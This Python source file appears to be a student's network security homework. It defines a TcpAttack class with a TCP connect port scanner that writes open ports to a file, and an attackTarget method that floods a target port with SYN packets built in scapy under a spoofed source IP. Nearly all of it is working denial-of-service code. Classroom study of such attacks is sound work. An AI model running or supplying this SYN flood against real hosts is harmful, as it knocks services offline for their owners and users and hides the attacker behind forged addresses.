#Homework Number: 8
#Name: Ranjan Behl
#ECN Login: rbehl 
#Due Date: 03/30/21
import sys
import socket
import re
import os.path
from scapy.all import *

class TcpAttack:
    #spoofIP: String containing the IP address to spoof
    #targetIP: String containing the IP address of the target computer to attack
    def __init__(self,spoofIP,targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    #rangeStart: Integer designting the first port in the range of ports being scanned.
    #rangeEnd: Integer designating the last port in the range of ports being scanned
    #No return value, but writes open ports to openports.txt
    def scanTarget(self,rangeStart,rangeEnd):
        openPorts = []
        verbosity = 0
        for testport in range(rangeStart,rangeEnd+1):
            sock  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP,testport))
                openPorts.append(testport)
                if verbosity: print (testport)
                sys.stdout.write("%s" % testport)
                sys.stdout.flush()
            except:
                if verbosity: print ("Port closed: ", testport)
                sys.stdout.write(".")
                sys.stdout.flush()
        
        servicePorts = {}
        if os.path.exists("/etc/services"):
            IN = open("/etc/services")
            for line in IN:
                line = line.strip()
                if line == '': continue
                if (re.match(r'^\s*#' , line)): continue
                entries = re.split(r'\s+', line)
                servicePorts[entries[1]] = ' '.join(re.split(r'\s+',line))
            IN.close()
        
        output = open("openports.txt", 'w')
        if not openPorts:
            print ("\n\nNo open ports in the range specified\n")
        else:
            print ("\n\nThe open ports:\n\n")
            for k in range(0, len(openPorts)):
                if len(servicePorts) > 0:
                    for portname in sorted(servicePorts):
                        pattern = r'^' + str(openPorts[k]) + r'/'
                        if re.search(pattern, str(portname)):
                            print ("%d:          %s" %(openPorts[k],servicePorts[portname]))
                else:
                    print (openPorts[k])
                output.write("%s\n" % openPorts[k])
        output.close()

    #port: Integer designating the port that the attack will use
    #numSyn: Integer of SYN packets to send to target IP address at the given port
    #If the port is open, perform DoS attack and return 1. Otherwise return 0.
    def attackTarget(self,port,numSyn):
        #check to see if the port is open

        '''
        portFile = open("openports.txt",'r')
        portList = portFile.readlines()
        ports = [p for p in portList]
        if port not in ports:
            return 0
        '''
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        loc = (self.targetIP,port)
        if(sock.connect_ex(loc) == 0):
            for i in range(numSyn):
                IPHeader = IP(src = self.spoofIP, dst = self.targetIP)
                TCPHeader = TCP(flags = "S", sport = RandShort(), dport = port)
                packet = IPHeader/TCPHeader
                try:
                    #need to use sudo for this to work
                    send(packet)
                except Exception as e:
                    print (e)
            return 1
        else:
            sock.close()
            return 0 